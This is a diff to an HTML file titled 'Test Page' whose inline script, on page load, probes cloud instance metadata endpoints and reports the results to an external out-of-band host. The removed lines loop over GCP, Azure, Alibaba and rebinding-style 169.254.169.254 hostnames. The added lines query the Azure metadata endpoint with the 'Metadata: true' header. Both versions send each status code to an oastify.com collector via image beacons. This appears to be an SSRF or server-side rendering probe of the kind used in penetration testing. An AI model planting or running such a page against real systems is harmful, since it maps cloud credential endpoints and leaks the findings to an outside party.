@@ -3,36 +3,27 @@
 <head>
   <title>Test Page</title>
   <script>
-    const targets = [
-      "https://metadata.google.internal/",
-      "https://metadata.google.internal/computeMetadata/v1/",
-      "https://metadata.google.internal/computeMetadata/v1/instance/",
-      "https://metadata.google.internal/computeMetadata/v1/project/",
-      "https://management.azure.com/",
-      "https://100.100.100.200/latest/meta-data/",
-      "https://169.254.169.254.nip.io/",
-      "https://169.254.169.254.sslip.io/",
-      "https://169-254-169-254.myssl.com/"
-    ];
-
+    const url = "https://management.azure.com/metadata/instance?api-version=2021-02-01";
     const timestamp = Date.now();
 
-    targets.forEach(url => {
-      fetch(url)
-        .then(res => {
-          const status = res.status;
-          const tag = (status === 404) ? "fail" : "hit";
-          new Image().src = "https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/" + tag +
-                            "?target=" + encodeURIComponent(url) +
-                            "&status=" + status +
-                            "&ts=" + timestamp;
-        })
-        .catch(() => {
-          new Image().src = "https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/fail" +
-                            "?target=" + encodeURIComponent(url) +
-                            "&error=network" +
-                            "&ts=" + timestamp;
-        });
+    fetch(url, {
+      headers: {
+        "Metadata": "true"
+      }
+    })
+    .then(res => {
+      const status = res.status;
+      const tag = (status === 404 || status === 400) ? "fail" : "hit";
+      new Image().src = "https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/" + tag +
+                        "?target=" + encodeURIComponent(url) +
+                        "&status=" + status +
+                        "&ts=" + timestamp;
+    })
+    .catch(() => {
+      new Image().src = "https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/fail" +
+                        "?target=" + encodeURIComponent(url) +
+                        "&error=network" +
+                        "&ts=" + timestamp;
     });
   </script>
 </head>
